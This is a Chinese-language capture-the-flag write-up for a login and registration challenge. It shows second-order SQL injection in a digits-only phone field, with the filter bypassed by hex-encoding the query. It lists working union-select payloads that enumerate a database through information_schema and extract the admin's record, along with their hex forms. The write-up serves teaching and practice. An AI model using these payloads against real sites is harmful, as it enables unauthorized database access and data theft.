# phone number

> 分类：Web

## 题目描述

登录注册页面，SQL 注入。注入点在注册的 phone 字段（只能输入数字），通过 16 进制绕过过滤。

## 考察知识点

- SQL 注入（数字型）
- 16 进制绕过非数字过滤
- information_schema

## 解法

1. 注册登录后，check.php 页面源码有注释"听说 admin 的电话藏着大秘密哦～"，且回显"有 N 个人和您用同一电话"，判断注入点在 phone（数字型，只有一列回显）。

2. phone 字段只能输入数字，把 SQL 语句转成 16 进制（前面加 `0x`）绕过过滤，截包提交。

3. 判断字段数（`order by 2` 报错，说明 1 个字段），构造查询：

```sql
-1 union select database()
-1 union select group_concat(schema_name) from information_schema.schemata
-1 union select group_concat(table_name) from information_schema.tables where table_schema='webdb'
-1 union select group_concat(column_name) from information_schema.columns where table_name='user'
-1 union select phone from user where username='admin'
```

4. 转 16 进制提交：

```
0x2D3120756E696F6E2073656C6563742064617461626173652829
...
0x2D3120756E696F6E2073656C6563742070686F6E652066726F6D207573657220776865726520757365726E616D653D2761646D696E27
```

5. 登录点击 check 触发二次注入，查到 admin 的 phone 即为 flag。

## 参考答案

（flag 通过 union 注入查询 admin 的 phone 得到）

## 来源

- 作者：Zeker62 | https://www.cnblogs.com/Zeker62/p/15348526.html
- 作者：烟敛寒林o | https://blog.csdn.net/dyw_666666/article/details/89874060
